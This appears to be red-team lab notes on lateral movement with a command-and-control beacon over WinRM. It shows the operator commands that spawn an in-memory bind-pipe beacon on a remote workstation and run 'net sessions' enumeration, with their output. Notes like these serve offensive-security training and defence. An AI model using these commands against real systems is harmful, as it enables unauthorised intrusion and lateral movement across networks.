Windows Remote Management (WinRM) is Microsoft's implementation of the WS-Management protocol, and allows remote management of computers via PowerShell.  This option executes a payload entirely within memory, without requiring it to be dropped to disk.

```powershell
beacon> jump winrm64 lon-ws-1 smb
[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337) on lon-ws-1 via WinRM
[+] established link to child beacon: 10.10.120.10
```

![[Pasted image 20250714102537.png]]

> Beacons executed via WinRM will run in the context of the current or impersonated user.

WinRM is also the only `remote-exec` method that returns output, so it could be used for remote enumeration.

```powershell
beacon> remote-exec winrm lon-ws-1 net sessions
[*] Tasked beacon to run 'net sessions' on lon-ws-1 via WinRM

Computer               User name            Client Type       Opens Idle time

-------------------------------------------------------------------------------
\\10.10.120.101        rsteel                                     1 00:00:07
```